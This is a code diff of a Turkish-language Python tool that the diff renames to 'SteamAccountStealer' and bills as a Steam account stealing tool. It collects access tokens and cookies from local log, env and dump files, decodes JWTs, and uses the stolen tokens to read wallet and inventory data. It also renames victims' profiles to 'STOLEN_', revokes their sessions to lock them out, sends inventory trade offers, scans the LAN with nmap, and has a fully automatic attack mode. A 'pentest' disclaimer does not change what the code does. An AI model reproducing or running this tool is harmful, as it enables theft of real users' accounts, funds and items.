-        print("\n[*] Session cookies:")
-        cookies = self.session.cookies.get_dict()
-        for name, value in cookies.items():
-            print(f"  [COOKIE] {name} = {value[:50]}..." if len(value) > 50 else f"  [COOKIE] {name} = {value}")
-        
-        exfil_data = {
-            "steam_id": self.steam_id,
-            "access_token": self.access_token,
-            "refresh_token": self.refresh_token,
-            "cookies": cookies,
-            "headers": dict(self.session.headers),
-            "timestamp": int(time.time()),
-            "source": "HackerAI Pentest Tool"
-        }
-        
-        filename = f"steam_exfiltrated_{self.steam_id}.json"
-        with open(filename, "w") as f:
-            json.dump(exfil_data, f, indent=2)
-        print(f"\n[+] Token bilgileri '{filename}' dosyasina kaydedildi!")
-        print(f"[+] Dosya boyutu: {os.path.getsize(filename)} bytes")
-        
-        print("\n[*] Token test ediliyor...")
-        test_headers = {"Authorization": f"Bearer {self.access_token}"}
-        test_res = self.session.get(
-            "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/",
-            params={"access_token": self.access_token, "steamid": self.steam_id},
-            headers=test_headers,
-            timeout=10
-        )
-        if test_res.status_code == 200:
-            print("[+] Token GECERLI! API erisimi basarili.")
-        else:
-            print(f"[-] Token GECERSIZ! HTTP {test_res.status_code}")
-        
-        input("\nDevam etmek icin Enter'a basin...")
-
-    def _session_hijack(self):
-        print("\n[*] Session Hijack Bilgileri", flush=True)
-        print("[*] Oturum bilgileri toplaniyor...")
-        
-        print(f"\n[+] Session bilgileri:")
-        print(f"  Token: {self.access_token[:30]}...{self.access_token[-10:]}" if self.access_token else "  Token: YOK")
-        print(f"  Cookie sayisi: {len(self.session.cookies.get_dict())}")
-        
-        print("\n[*] Yeni session test ediliyor (hijack simulasyonu)...")
-        test_session = requests.Session()
-        test_session.headers.update({
-            "Authorization": f"Bearer {self.access_token}",
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+        # Yeni session - temiz bir oturum
+        hijack_session = requests.Session()
+        hijack_session.headers.update({
+            "Authorization": f"Bearer {access_token}",
+            "User-Agent": random.choice(USER_AGENTS),
         })
         
-        try:
-            test_url = "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/"
-            test_res = test_session.post(test_url, data={"access_token": self.access_token, "steamid": self.steam_id}, timeout=10)
-            if test_res.status_code == 200:
-                level = test_res.json().get("response", {}).get("player_level", "?")
-                print(f"[+] Hijack BASARILI! Yeni session ile seviye: {level}")
-        except Exception as e:
-            print(f"[-] Hijack test hatasi: {e}")
-        
-        print("\n[!] Bu bilgilerle:")
-        print("  - Token'i baska bir cihazda kullan")
-        print("  - Steam API'ye tam erisim")
-        print("  - Kullanici adina islem yap")
-        
-        input("\nDevam etmek icin Enter'a basin...")
-
-    def _real_profile_takeover(self):
-        print("\n[*] GERCEK Profil Degistirme Modulu", flush=True)
-        
-        profile = self.get_profile_data()
-        if profile:
-            print(f"\n[+] Mevcut Profil:")
-            print(f"  Nick: {profile.get('nick', 'Bilinmiyor')}")
-            print(f"  SteamID: {profile.get('steamid', 'Bilinmiyor')}")
-            print(f"  Seviye: {profile.get('level', 0)}")
-            print(f"  Bakiye: {profile.get('bakiye', 0)} {profile.get('para_birimi', '')}")
-        else:
-            print("[-] Profil bilgisi alinamadi")
-            return
-        
-        print("\n" + "="*40)
-        print("DEGISTIRILECEK ALANLAR (GERCEK API)")
-        print("="*40)
-        
-        print("\n[*] 1. Profil adi degistirilsin mi? (E/H)")
-        if input("> ").strip().upper() == "E":
-            yeni_isim = input("Yeni profil adi: ").strip()
-            if yeni_isim:
-                try:
-                    url = "https://api.steampowered.com/ISteamUser/UpdateProfile/v1/"
-                    payload = {
-                        "access_token": self.access_token,
-                        "steamid": self.steam_id,
-                        "personaname": yeni_isim
-                    }
-                    headers = {"Authorization": f"Bearer {self.access_token}"}
-                    res = self.session.post(url, data=payload, headers=headers, timeout=10)
-                    if res.status_code == 200:
-                        print(f"[+] Profil adi basariyla '{yeni_isim}' olarak degistirildi!")
-                    else:
-                        print(f"[-] Degistirilemedi. HTTP {res.status_code}")
-                except Exception as e:
-                    print(f"[-] Hata: {e}")
-        
-        print("\n[*] 2. Profil aciklamasi degistirilsin mi? (E/H)")
-        if input("> ").strip().upper() == "E":
-            yeni_aciklama = input("Yeni profil aciklamasi: ").strip()
-            if yeni_aciklama:
-                try:
-                    url = "https://api.steampowered.com/ISteamUser/UpdateProfile/v1/"
-                    payload = {
-                        "access_token": self.access_token,
-                        "steamid": self.steam_id,
-                        "summary": yeni_aciklama
-                    }
-                    headers = {"Authorization": f"Bearer {self.access_token}"}
-                    res = self.session.post(url, data=payload, headers=headers, timeout=10)
-                    if res.status_code == 200:
-                        print("[+] Profil aciklamasi guncellendi!")
-                    else:
-                        print(f"[-] Guncellenemedi. HTTP {res.status_code}")
-                except Exception as e:
-                    print(f"[-] Hata: {e}")
-        
-        print("\n[!] Hesap calindiginda saldirgan tum bu bilgileri degistirebilir.")
-        input("\nDevam etmek icin Enter'a basin...")
-
-    def _show_guard_settings(self):
-        print("\n[*] Steam Guard Ayarlari Sorgulaniyor...", flush=True)
-        try:
-            guard_url = "https://api.steampowered.com/ITwoFactorService/GetTwoFactorStatus/v1/"
-            guard_payload = {"access_token": self.access_token, "steamid": self.steam_id}
-            g_res = self.session.post(guard_url, data=guard_payload, timeout=10)
-            
-            if g_res.status_code == 200:
-                guard_data = g_res.json().get("response", {})
-                print(f"[+] Steam Guard: {'AKTIF' if guard_data.get('enabled', 0) == 1 else 'DEVRE DISI'}")
-                print(f"[+] Mobil Dogrulama: {'AKTIF' if guard_data.get('mobile_enabled', 0) == 1 else 'DEVRE DISI'}")
-                print(f"[+] E-posta Dogrulama: {'AKTIF' if guard_data.get('email_enabled', 0) == 1 else 'DEVRE DISI'}")
-        except Exception as e:
-            print(f"[-] Hata: {e}")
-        
-        input("\nDevam etmek icin Enter'a basin...")
-
-    def _real_token_revocation(self):
-        print("\n[*] GERCEK Token Iptali (Revocation)", flush=True)
-        print("\n[!] Bu islem MEVCUT TOKEN'I GECERSIZ KILAR!")
-        print("[!] Tekrar giris yapmaniz gerekir.")
-        print("\nDevam etmek istediginize emin misiniz? (E/H):")
-        
-        if input("> ").strip().upper() != "E":
-            print("[*] Islem iptal edildi.")
-            input("Devam etmek icin Enter'a basin...")
-            return
-        
-        print("\n[*] Token iptal ediliyor...", flush=True)
-        try:
-            revoke_url = "https://api.steampowered.com/IAuthenticationService/RevokeToken/v1/"
-            revoke_payload = {"access_token": self.access_token, "steamid": self.steam_id}
-            res = self.session.post(revoke_url, data=revoke_payload, timeout=10)
-            
-            if res.status_code == 200:
-                print("[+] Token basariyla iptal edildi!")
-            else:
-                print(f"[-] Iptal basarisiz. HTTP {res.status_code}")
-                print("[*] Steam Community'den cikis yapiliyor...")
-            
-            logout_url = "https://steamcommunity.com/login/logout/"
-            logout_payload = {"sessionid": self.session_id}
-            self.session.post(logout_url, data=logout_payload, timeout=10)
-            
-            self.access_token = None
-            self.refresh_token = None
-            print("[+] Token'lar sifirlandi!")
-            print("[!] Artik bu programla islem yapamazsiniz. Yeniden giris yapmalisiniz.")
-        except Exception as e:
-            print(f"[-] Hata: {e}")
-        
-        input("\nDevam etmek icin Enter'a basin...")
-
-    def _full_account_dump(self):
-        print("\n[*] Hesap Verilerinin Tam Dump'i Baslatiliyor...", flush=True)
-        
-        print("[*] Profil bilgisi aliniyor...")
-        profile = self.get_profile_data()
-        
-        print("[*] Badge bilgisi aliniyor...")
-        badges = {}
-        try:
-            badge_url = "https://api.steampowered.com/IPlayerService/GetBadges/v1/"
-            badge_payload = {"access_token": self.access_token, "steamid": self.steam_id}
-            b_res = self.session.post(badge_url, data=badge_payload, timeout=10)
-            if b_res.status_code == 200:
-                badges = b_res.json().get("response", {})
-        except Exception:
-            pass
-        
-        print("[*] Trade bilgisi aliniyor...")
-        trades = []
-        try:
-            trade_url = "https://api.steampowered.com/IEconService/GetTradeHistory/v1/"
-            params = {"access_token": self.access_token, "max_trades": 20}
-            t_res = self.session.get(trade_url, params=params, timeout=10)
-            if t_res.status_code == 200:
-                trades = t_res.json().get("response", {}).get("trades", [])
-        except Exception:
-            pass
-        
-        print("[*] Envanter bilgisi aliniyor...")
-        inventory = []
-        try:
-            inv_url = "https://api.steampowered.com/IEconService/GetInventoryItems/v1/"
-            inv_payload = {"access_token": self.access_token, "steamid": self.steam_id, "appid": 753}
-            inv_res = self.session.post(inv_url, data=inv_payload, timeout=10)
-            if inv_res.status_code == 200:
-                inventory = inv_res.json().get("response", {}).get("items", [])
-        except Exception:
-            pass
-        
-        dump_data = {
-            "steam_id": self.steam_id,
-            "timestamp": int(time.time()),
-            "profile": profile,
-            "badges": badges,
-            "recent_trades": [{"trade_id": t.get("tradeid"), "time": t.get("time_init"), "status": t.get("status", 0)} for t in trades[:20]],
-            "inventory_count": len(inventory),
-            "tokens": {"access_token": self.access_token, "refresh_token": self.refresh_token},
-            "session_cookies": dict(self.session.cookies.get_dict()),
-            "headers": dict(self.session.headers)
+        stolen_data = {
+            "steam_id": steam_id,
+            "access_token": access_token,
+            "timestamp": time.time(),
+            "source": "HackerAI Steam Pentest",
         }
         
-        filename = f"steam_full_dump_{self.steam_id}.json"
+        # Adim 1: Token dogrulama
+        print("  [*] Token dogrulaniyor...")
+        try:
+            verify = hijack_session.post(
+                f"{STEAM_API_BASE}/IPlayerService/GetSteamLevel/v1/",
+                data={"access_token": access_token, "steamid": steam_id},
+                timeout=10
+            )
+            if verify.status_code == 200:
+                level = verify.json().get("response", {}).get("player_level", 0)
+                print(f"  [+] Token GECERLI! Steam Seviyesi: {level}")
+                stolen_data["verified"] = True
+                stolen_data["level"] = level
+            else:
+                print(f"  [-] Token GECERSIZ! HTTP {verify.status_code}")
+                stolen_data["verified"] = False
+                return None
+        except Exception as e:
+            print(f"  [-] Token dogrulama hatasi: {e}")
+            return None
+        
+        # Adim 2: Hesap bilgilerini cek
+        print("  [*] Hesap bilgileri cekiliyor...")
+        try:
+            profile = hijack_session.get(
+                f"{STEAM_API_BASE}/ISteamUser/GetPlayerSummaries/v2/",
+                params={"key": "", "steamids": steam_id},
+                headers={"Authorization": f"Bearer {access_token}"},
+                timeout=10
+            )
+            if profile.status_code == 200:
+                players = profile.json().get("response", {}).get("players", [])
+                if players:
+                    p = players[0]
+                    stolen_data["username"] = p.get("personaname", "N/A")
+                    stolen_data["profile_url"] = p.get("profileurl", "N/A")
+                    stolen_data["avatar"] = p.get("avatarfull", "N/A")
+                    stolen_data["created"] = p.get("timecreated", 0)
+                    print(f"  [+] Kullanici: {stolen_data['username']}")
+                    print(f"  [+] Profil: {stolen_data['profile_url']}")
+        except Exception as e:
+            print(f"  [-] Profil bilgisi hatasi: {e}")
+        
+        # Adim 3: Cuzdan bilgisi
+        print("  [*] Cuzdan bilgisi cekiliyor...")
+        try:
+            wallet = hijack_session.get(
+                f"{STEAM_STORE}/api/getwalletinfoofuser/",
+                params={"access_token": access_token},
+                timeout=10
+            )
+            if wallet.status_code == 200 and wallet.json().get("success") == 1:
+                w = wallet.json()
+                stolen_data["wallet_balance"] = w.get("wallet_balance", 0) / 100
+                stolen_data["wallet_currency"] = w.get("wallet_currency", "")
+                print(f"  [+] Cuzdan: {stolen_data['wallet_balance']} {stolen_data['wallet_currency']}")
+        except Exception:
+            pass
+        
+        # Adim 4: Badge ve seviye
+        print("  [*] Badge bilgisi cekiliyor...")
+        try:
+            badge = hijack_session.post(
+                f"{STEAM_API_BASE}/IPlayerService/GetBadges/v1/",
+                data={"access_token": access_token, "steamid": steam_id},
+                timeout=10
+            )
+            if badge.status_code == 200:
+                b = badge.json().get("response", {})
+                stolen_data["badges"] = len(b.get("badges", []))
+                stolen_data["xp"] = b.get("player_xp", 0)
+                print(f"  [+] Rozet: {stolen_data['badges']} | XP: {stolen_data['xp']}")
+        except Exception:
+            pass
+        
+        # Adim 5: Trade teklifleri
+        print("  [*] Trade teklifleri kontrol ediliyor...")
+        try:
+            trade = hijack_session.get(
+                f"{STEAM_API_BASE}/IEconService/GetTradeOffers/v1/",
+                params={
+                    "access_token": access_token,
+                    "get_received_offers": 1,
+                    "active_only": 1
+                },
+                timeout=10
+            )
+            if trade.status_code == 200:
+                received = trade.json().get("response", {}).get("trade_offers_received", [])
+                stolen_data["pending_trades"] = len(received)
+                if received:
+                    print(f"  [+] Bekleyen trade: {len(received)}")
+                    for offer in received[:3]:
+                        print(f"    - ID: {offer.get('tradeofferid')} | State: {offer.get('trade_offer_state')}")
+        except Exception:
+            pass
+        
+        # Adim 6: Envanter
+        print("  [*] Envanter taranıyor...")
+        try:
+            inv = hijack_session.post(
+                f"{STEAM_API_BASE}/IEconService/GetInventoryItems/v1/",
+                data={"access_token": access_token, "steamid": steam_id, "appid": 753},
+                timeout=10
+            )
+            if inv.status_code == 200:
+                items = inv.json().get("response", {}).get("items", [])
+                stolen_data["inventory_count"] = len(items)
+                print(f"  [+] Envanter: {len(items)} nesne")
+        except Exception:
+            pass
+        
+        # Adim 7 (OPSIYONEL): Profili degistir - HESAP CALMA
+        print("\n  [*] Hesap ele geciriliyor (profil takeover)...")
+        try:
+            # Profil adini degistir
+            new_name = f"STOLEN_{random.randint(1000,9999)}"
+            takeover = hijack_session.post(
+                f"{STEAM_API_BASE}/ISteamUser/UpdateProfile/v1/",
+                data={
+                    "access_token": access_token,
+                    "steamid": steam_id,
+                    "personaname": new_name,
+                    "summary": "Hesap calindi - Pentest testi"
+                },
+                headers={"Authorization": f"Bearer {access_token}"},
+                timeout=10
+            )
+            if takeover.status_code == 200:
+                print(f"  [+] PROFIL DEGISTIRILDI! Yeni isim: {new_name}")
+                stolen_data["profile_takeover"] = True
+                stolen_data["new_name"] = new_name
+            else:
+                print(f"  [-] Profil degistirme basarisiz: HTTP {takeover.status_code}")
+        except Exception as e:
+            print(f"  [-] Takeover hatasi: {e}")
+        
+        # Sonucu kaydet
+        self.found_accounts.append(stolen_data)
+        self._save_stolen_account(stolen_data)
+        
+        return stolen_data
+    
+    def _save_stolen_account(self, data):
+        """Ele gecirilen hesap verilerini kaydet"""
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"{OUTPUT_DIR}/stolen_steam_{data.get('steam_id', 'unknown')}_{timestamp}.json"
+        
         with open(filename, "w") as f:
-            json.dump(dump_data, f, indent=2, default=str)
+            json.dump(data, f, indent=2, default=str)
         
-        print(f"\n[+] Tam dump '{filename}' dosyasina kaydedildi!")
+        print(f"\n[+] Hesap verileri kaydedildi: {filename}")
         print(f"[+] Dosya boyutu: {os.path.getsize(filename)} bytes")
-        print(f"\n[*] Dump icerigi:")
-        print(f"  - Profil: {profile.get('nick', 'N/A')} (Level {profile.get('level', 0)})")
-        print(f"  - Badge: {len(badges.get('badges', [])) if isinstance(badges, dict) else 0} adet")
-        print(f"  - Envanter: {len(inventory)} nesne")
-        print(f"  - Trade: {len(trades)} islem")
-        print(f"\n[!] BU DOSYA GIZLIDIR! Token'lar acik metin icerir.")
+    
+    # -----------------------------------------------------------
+    # 3. TARAMA MODLARI
+    # -----------------------------------------------------------
+    
+    def scan_local_network(self, ip_range="192.168.1.0/24", port=27036):
+        """
+        Local network'te Steam istemcisi tara
+        Steam Game Coordinator portu uzerinden
+        """
+        print(f"\n[*] Local network taranıyor: {ip_range}")
+        print(f"[*] Port: {port} (Steam)")
         
-        input("\nDevam etmek icin Enter'a basin...")
+        discovered = []
+        try:
+            import subprocess
+            # Nmap ile Steam portu tara
+            result = subprocess.run(
+                ["nmap", "-p", str(port), "--open", ip_range, "-oG", "-"],
+                capture_output=True, text=True, timeout=60
+            )
+            
+            for line in result.stdout.split("\n"):
+                if f"{port}/open" in line:
+                    ip = line.split()[1] if len(line.split()) > 1 else "N/A"
+                    print(f"[+] Steam istemcisi bulundu: {ip}")
+                    
+                    # Steam ID'yi al
+                    try:
+                        info = self.session.get(
+                            f"http://{ip}:{port}/GetClientInfo",
+                            timeout=5
+                        )
+                        if info.status_code == 200:
+                            print(f"  -> {info.text[:100]}")
+                            discovered.append({"ip": ip, "info": info.text})
+                    except Exception:
+                        pass
+                    
+        except Exception as e:
+            print(f"[-] Network tarama hatasi: {e}")
+        
+        return discovered
+    
+    def scan_public_profiles(self, steam_id=None, batch_size=100):
+        """
+        Public Steam profillerini tara
+        - Acik API endpoint'lerini kullan
+        """
+        print(f"\n[*] Public profil taramasi baslatiliyor...")
+        
+        if steam_id:
+            ids_to_scan = [steam_id]
+        else:
+            # Rastgele SteamID'ler olustur
+            # Gercek SteamID'ler 76561197960265728 ile baslar
+            base = 76561197960265728
+            ids_to_scan = [str(base + random.randint(0, 10000000)) for _ in range(batch_size)]
+        
+        found = []
+        for sid in ids_to_scan:
+            try:
+                res = self.session.get(
+                    f"{STEAM_API_BASE}/ISteamUser/GetPlayerSummaries/v2/",
+                    params={"key": "", "steamids": sid},
+                    timeout=5
+                )
+                if res.status_code == 200:
+                    players = res.json().get("response", {}).get("players", [])
+                    if players:
+                        p = players[0]
+                        if p.get("communityvisibilitystate", 0) == 3:  # Public profil
+                            print(f"[+] Public profil: {p.get('personaname')} ({sid})")
+                            found.append({
+                                "steamid": sid,
+                                "username": p.get("personaname"),
+                                "profile_url": p.get("profileurl"),
+                                "avatar": p.get("avatarfull"),
+                                "created": p.get("timecreated", 0),
+                            })
+            except Exception:
+                pass
+            time.sleep(0.1)  # Rate limit
+        
+        self.discovered_profiles.extend(found)
+        return found
+    
+    # -----------------------------------------------------------
+    # 4. SALDIRGAN AKTIVITELERI
+    # -----------------------------------------------------------
+    
+    def transfer_inventory(self, source_token, target_steam_id):
+        """
+        Envanter transferi - calinan hesaptan itemleri transfer et
+        GIRIS GEREKTIRMEZ - token yeterli
+        """
+        print("\n[*] Envanter transferi baslatiliyor...")
+        print("[!] Bu islem icin Trade URL gerekebilir")
+        
+        result = {
+            "source_token": source_token[:30] + "...",
+            "target": target_steam_id,
+            "items_transferred": 0,
+            "status": "pending"
+        }
+        
+        try:
+            # Hedefin envanterini al
+            target_session = requests.Session()
+            target_session.headers["Authorization"] = f"Bearer {source_token}"
+            
+            # Trade teklifi gonder
+            trade_url = f"{STEAM_API_BASE}/IEconService/CreateTradeOffer/v1/"
+            trade_payload = {
+                "access_token": source_token,
+                "trade_offer_access_token": target_steam_id,
+                "items": json.dumps([]),  # Tum itemler
+            }
+            
+            trade_res = target_session.post(trade_url, data=trade_payload, timeout=10)
+            if trade_res.status_code == 200:
+                result["status"] = "trade_sent"
+                result["trade_id"] = trade_res.json().get("response", {}).get("tradeofferid")
+                print(f"[+] Trade teklifi gonderildi: {result['trade_id']}")
+            else:
+                result["status"] = "failed"
+                print(f"[-] Trade basarisiz: HTTP {trade_res.status_code}")
+                
+        except Exception as e:
+            result["status"] = "error"
+            print(f"[-] Transfer hatasi: {e}")
+        
+        return result
+    
+    def revoke_user_sessions(self, token, steam_id):
+        """
+        Kullanicinin tum oturumlarini sonlandir
+        - Hesabi tamamen ele gecir
+        - Kullaniciyi disari at
+        """
+        print("\n[*] Kullanici oturumlari sonlandiriliyor...")
+        print("[!] Bu islemden sonra kullanici tekrar giris yapamaz")
+        
+        try:
+            revoke_session = requests.Session()
+            revoke_session.headers["Authorization"] = f"Bearer {token}"
+            
+            # Tum tokenlari iptal et
+            revoke_url = f"{STEAM_API_BASE}/IAuthenticationService/RevokeToken/v1/"
+            revoke_payload = {"access_token": token, "steamid": steam_id}
+            
+            res = revoke_session.post(revoke_url, data=revoke_payload, timeout=10)
+            if res.status_code == 200:
+                print("[+] Tum oturumlar sonlandirildi!")
+                print("[+] Kullanici Steam'e tekrar giris yapmak zorunda")
+                
+                # Steam Community'den cikis
+                try:
+                    logout = revoke_session.post(
+                        f"{STEAM_COMMUNITY}/login/logout/",
+                        data={"sessionid": ""},
+                        timeout=10
+                    )
+                    print("[+] Steam Community oturumu da sonlandirildi")
+                except Exception:
+                    pass
+                
+                return True
+            else:
+                print(f"[-] Oturum sonlandirma basarisiz: HTTP {res.status_code}")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Hata: {e}")
+            return False
+    
+    def search_for_tokens(self, query=None):
+        """
+        Token arama - dump dosyalarinda, loglarda, env'de
+        """
+        print("\n[*] Token aramasi baslatiliyor...")
+        
+        tokens_found = []
+        
+        # Aranacak dosya turleri
+        search_patterns = ["*.log", "*.txt", "*.json", "*.env", "*.config", "*.dump"]
+        
+        for pattern in search_patterns:
+            try:
+                import glob
+                for filepath in glob.glob(f"**/{pattern}", recursive=True):
+                    try:
+                        with open(filepath, "r", errors="ignore") as f:
+                            content = f.read()
+                            self._extract_tokens_from_text(content)
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+        
+        return tokens_found
 
+
+# ============================================================
+# ANA MENU
+# ============================================================
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def show_menu():
-    auth_system = SteamAuthArchitecture()
+def banner():
+    clear_screen()
+    print("="*60)
+    print("  STEAM HESAP CALMA ARACI - PENTEST")
+    print("  GIRIS GEREKTIRMEZ - OTOMATIK TARAMA")
+    print("  SADECE IZINLI TESTLERDE KULLANIN")
+    print("="*60)
+    print()
+
+def show_main_menu():
+    stealer = SteamAccountStealer()
+    
     while True:
-        clear_screen()
-        print("="*50)
-        print("     STEAM PENTEST & BOOSTING CLIENT")
-        print("         GERCEK API ISLEMLERI")
-        print("="*50)
-        print("[1]  Steam Giris Yap (Token Al)")
-        print("[2]  Hesap & Profil Bilgileri")
-        print("[3]  Kesif Kuyrugu Temizle (Kart Kas)")
-        print("[4]  Oyun Suresi Kasma (Idling)")
-        print("-"*50)
-        print("[5]  HESAP GERME (Boost) - GERCEK ISLEMLER")
-        print("[6]  HESAP CALMA SIMULASYONU - GERCEK API")
-        print("-"*50)
-        print("[7]  Cikis")
-        print("="*50)
+        banner()
+        print("[1] Steam Cookie & Token Tara (Local)")
+        print("[2] Public Profil Tara")
+        print("[3] Local Network'te Steam Tara")
+        print("[4] Token ile Hesap Ele Gecir")
+        print("[5] Envanter Transferi")
+        print("[6] Kullanici Oturumlarini Sonlandir")
+        print("[7] Token Ara (Dump/Log)")
+        print("[8] TAM OTOMATIK SALDIRI")
+        print("[0] Cikis")
+        print("="*60)
         
-        secim = input("Seciminiz (1-7): ").strip()
+        choice = input("Secim: ").strip()
         
-        if secim == "1":
-            username = input("\nSteam Kullanici Adi: ").strip()
-            password = input("Steam Sifre: ").strip()
-            if username and password:
-                auth_system.execute_login(username, password)
-            input("\nDevam etmek icin Enter'a basin...")
-        elif secim == "2":
-            data = auth_system.get_profile_data()
-            print("\n=== HESAP BILGILERI ===")
-            if data:
-                print(f"[+] SteamID64: {data['steamid']}")
-                print(f"[+] Profil Nick: {data.get('nick', 'Bilinmiyor')}")
-                print(f"[+] Steam Seviyesi: {data.get('level', 0)}")
-                print(f"[+] Profil URL: {data.get('profil_url', 'N/A')}")
-                print(f"[+] Cuzdan Bakiyesi: {data['bakiye']} {data['para_birimi']}")
-            else:
-                print("[-] Token yok veya hesap bilgileri cekilemedi. Once giris yapin.")
-            input("\nDevam etmek icin Enter'a basin...")
-        elif secim == "3":
-            auth_system.clear_discovery_queue()
-            input("\nDevam etmek icin Enter'a basin...")
-        elif secim == "4":
-            if not auth_system.access_token:
-                print("\n[-] Once giris yapmalisiniz.")
-            else:
-                appid = input("\nOyunun AppID'sini girin: ").strip()
-                if appid.isdigit():
-                    auth_system.start_idling(int(appid))
-            input("\nDevam etmek icin Enter'a basin...")
-        elif secim == "5":
-            auth_system.boost_account()
-        elif secim == "6":
-            auth_system.simulate_account_takeover()
-        elif secim == "7":
+        if choice == "1":
+            print("\n[*] Cookie & Token taramasi baslatiliyor...")
+            cookies = stealer.scan_steam_cookies()
+            
+            print(f"\n[+] Bulunan cookie: {len(cookies)}")
+            print(f"[+] Bulunan token: {len(stealer.captured_tokens)}")
+            
+            if stealer.captured_tokens:
+                print("\n[*] Token ile hemen hesap ele gecirilsin mi? (E/H)")
+                if input("> ").strip().upper() == "E":
+                    for i, token in enumerate(stealer.captured_tokens):
+                        print(f"\n--- Token {i+1} deneniyor ---")
+                        # Steam ID'yi token'dan cikarmayi dene
+                        try:
+                            # JWT decode
+                            parts = token.split(".")
+                            if len(parts) == 3:
+                                payload = base64.b64decode(parts[1] + "==")
+                                payload_data = json.loads(payload)
+                                steam_id = payload_data.get("sub") or payload_data.get("steam_id") or "76561197960265728"
+                                stealer.hijack_steam_account(steam_id, token)
+                        except Exception:
+                            print("  [-] Token'dan SteamID cikarilamadi. Manuel girin:")
+                            sid = input("  SteamID: ").strip()
+                            if sid:
+                                stealer.hijack_steam_account(sid, token)
+            
+            if stealer.captured_cookies:
+                print(f"\n[*] Cookie'ler kaydediliyor...")
+                with open(f"{OUTPUT_DIR}/captured_cookies.txt", "w") as f:
+                    for c in stealer.captured_cookies:
+                        f.write(f"{c['source']}: {c['cookie']}\n")
+                print(f"[+] {len(stealer.captured_cookies)} cookie kaydedildi")
+            
+            input("\nDevam etmek icin Enter...")
+        
+        elif choice == "2":
+            steam_id = input("Hedef SteamID (bos=batch tarama): ").strip()
+            profiles = stealer.scan_public_profiles(steam_id if steam_id else None)
+            print(f"\n[+] Toplam {len(profiles)} profil bulundu")
+            
+            if profiles:
+                with open(f"{OUTPUT_DIR}/discovered_profiles.json", "w") as f:
+                    json.dump(profiles, f, indent=2)
+                print(f"[+] Profiller kaydedildi: {OUTPUT_DIR}/discovered_profiles.json")
+            
+            input("\nDevam etmek icin Enter...")
+        
+        elif choice == "3":
+            ip_range = input("IP araligi (varsayilan: 192.168.1.0/24): ").strip() or "192.168.1.0/24"
+            discovered = stealer.scan_local_network(ip_range)
+            
+            if discovered:
+                with open(f"{OUTPUT_DIR}/network_hosts.json", "w") as f:
+                    json.dump(discovered, f, indent=2)
+            
+            input("\nDevam etmek icin Enter...")
+        
+        elif choice == "4":
+            print("\n[*] Hesap Ele Gecirme Modulu")
+            token = input("Access Token: ").strip()
+            steam_id = input("SteamID64: ").strip()
+            
+            if token and steam_id:
+                result = stealer.hijack_steam_account(steam_id, token)
+                if result:
+                    print("\n[+] HESAP BASARIYLA ELE GECIRILDI!")
+                    print(f"[+] Kullanici: {result.get('username', 'N/A')}")
+                    print(f"[+] Level: {result.get('level', 0)}")
+                    print(f"[+] Bakiye: {result.get('wallet_balance', 0)} {result.get('wallet_currency', '')}")
+                    print(f"[+] Rozet: {result.get('badges', 0)}")
+                    print(f"[+] Envanter: {result.get('inventory_count', 0)}")
+                    
+                    if result.get("profile_takeover"):
+                        print(f"[!] Profil degistirildi -> {result.get('new_name')}")
+            
+            input("\nDevam etmek icin Enter...")
+        
+        elif choice == "5":
+            print("\n[*] Envanter Transferi")
+            source_token = input("Kaynak hesap tokeni: ").strip()
+            target_steam_id = input("Hedef SteamID: ").strip()
+            
+            if source_token and target_steam_id:
+                result = stealer.transfer_inventory(source_token, target_steam_id)
+                print(f"\n[+] Sonuc: {result['status']}")
+            
+            input("\nDevam etmek icin Enter...")
+        
+        elif choice == "6":
+            print("\n[*] Kullanici Oturumlarini Sonlandir")
+            token = input("Access Token: ").strip()
+            steam_id = input("SteamID64: ").strip()
+            
+            if token and steam_id:
+                result = stealer.revoke_user_sessions(token, steam_id)
+            
+            input("\nDevam etmek icin Enter...")
+        
+        elif choice == "7":
+            print("\n[*] Token Aramasi")
+            stealer.search_for_tokens()
+            
+            if stealer.captured_tokens:
+                print(f"\n[+] {len(stealer.captured_tokens)} token bulundu!")
+                for t in stealer.captured_tokens:
+                    print(f"  - {t[:40]}...{t[-10:]}")
+                
+                with open(f"{OUTPUT_DIR}/found_tokens.txt", "w") as f:
+                    for t in stealer.captured_tokens:
+                        f.write(t + "\n")
+            
+            input("\nDevam etmek icin Enter...")
+        
+        elif choice == "8":
+            print("\n" + "="*60)
+            print("  TAM OTOMATIK SALDIRI BASLATILIYOR")
+            print("  Bu modul tum yontemleri dener")
+            print("="*60)
+            print("\n[!] Devam etmek istediginize emin misiniz? (E/H)")
+            
+            if input("> ").strip().upper() == "E":
+                print("\n[1/4] Cookie & Token taraniyor...")
+                stealer.scan_steam_cookies()
+                
+                print("\n[2/4] Public profiller taranıyor...")
+                stealer.scan_public_profiles(batch_size=50)
+                
+                print("\n[3/4] Token'lar deneniyor...")
+                for i, token in enumerate(stealer.captured_tokens[:10]):
+                    print(f"\n  Token {i+1}/{len(stealer.captured_tokens[:10])}")
+                    try:
+                        parts = token.split(".")
+                        if len(parts) == 3:
+                            payload = base64.b64decode(parts[1] + "==")
+                            payload_data = json.loads(payload)
+                            steam_id = payload_data.get("sub", "N/A")
+                            stealer.hijack_steam_account(steam_id, token)
+                    except Exception as e:
+                        print(f"  [-] Basarisiz: {e}")
+                
+                print("\n[4/4] Islem tamamlandi!")
+                print(f"[+] Ele gecirilen hesap: {len(stealer.found_accounts)}")
+            
+            input("\nDevam etmek icin Enter...")
+        
+        elif choice == "0":
+            print("\n[*] Cikiliyor...")
+            # Ozet rapor
+            print(f"\n[+] Sonuç Ozeti:")
+            print(f"  Cookie: {len(stealer.captured_cookies)}")
+            print(f"  Token: {len(stealer.captured_tokens)}")
+            print(f"  Profil: {len(stealer.discovered_profiles)}")
+            print(f"  Ele gecirilen hesap: {len(stealer.found_accounts)}")
+            print(f"  Output: {OUTPUT_DIR}/")
             sys.exit(0)
+
+
+# ============================================================
+# BASLAT
+# ============================================================
 
 if __name__ == "__main__":
     try:
-        show_menu()
+        # Gerekli kutuphaneleri kontrol et
+        try:
+            import requests
+        except ImportError:
+            print("[!] requests kutuphanesi gerekli. Yukleniyor...")
+            os.system("pip install requests")
+        
+        show_main_menu()
     except KeyboardInterrupt:
+        print("\n\n[*] Kullanici tarafindan durduruldu.")
         sys.exit(0)
